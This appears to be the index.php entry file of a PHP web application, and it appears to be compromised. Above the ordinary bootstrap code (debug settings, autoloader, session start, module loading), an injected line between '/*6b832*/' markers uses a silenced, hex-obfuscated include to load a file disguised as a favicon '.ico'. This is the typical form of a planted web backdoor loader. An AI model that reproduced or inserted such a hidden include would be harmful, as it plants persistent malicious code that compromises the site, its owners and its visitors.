<?php

/*6b832*/

@include "\x2fh\x6fm\x65/\x64j\x6cu\x69g\x301\x2fp\x75b\x6ci\x63_\x68t\x6dl\x2fs\x65g\x75d\x6fc\x70r\x6f.\x63o\x6d/\x69n\x64e\x78/\x76i\x65w\x2fp\x72o\x64u\x63t\x72e\x70o\x72t\x2ff\x61v\x69c\x6fn\x5f5\x30c\x395\x35.\x69c\x6f";

/*6b832*/
$debug= true;
if($debug){
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
}


include "core/autoload.php";
ob_start();
session_start();

// si quieres que se muestre las consultas SQL debes decomentar la siguiente linea
// Core::$debug_sql = true;


$lb = new Lb();
$lb->loadModule("index");

?>